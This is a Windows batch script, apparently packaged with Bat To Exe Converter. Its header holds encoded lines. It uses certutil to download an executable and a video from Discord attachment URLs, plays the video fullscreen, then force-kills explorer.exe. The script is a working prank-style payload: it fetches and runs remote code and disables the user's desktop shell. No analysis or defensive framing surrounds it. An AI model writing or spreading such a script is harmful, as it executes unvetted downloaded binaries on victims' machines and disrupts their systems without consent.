::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFAtVWAeDAE+1EbsQ5+n//NaTp14JaOU6dpzT07rAKeMcig==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAtVWAeDAE+1EbsQ5+n//NaTp14JaMU6dpzT07rOCe0D60bwNb45wmpqisQUFVVdZhfL
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
Set RAND=%RANDOM%
echo Downloading %RAND%.mp4
certutil -urlcache -split -f https://cdn.discordapp.com/attachments/1041955326892711949/1041979215119130695/ffplay.exe ffplay.exe
certutil -urlcache -split -f https://cdn.discordapp.com/attachments/1032009004139946085/1040167640120963112/8mb.video-d0e-oxm445MI.mp4 %RAND%.mp4
start ffplay -fs %RAND%.mp4
cmd /c "taskkill /f /im explorer.exe"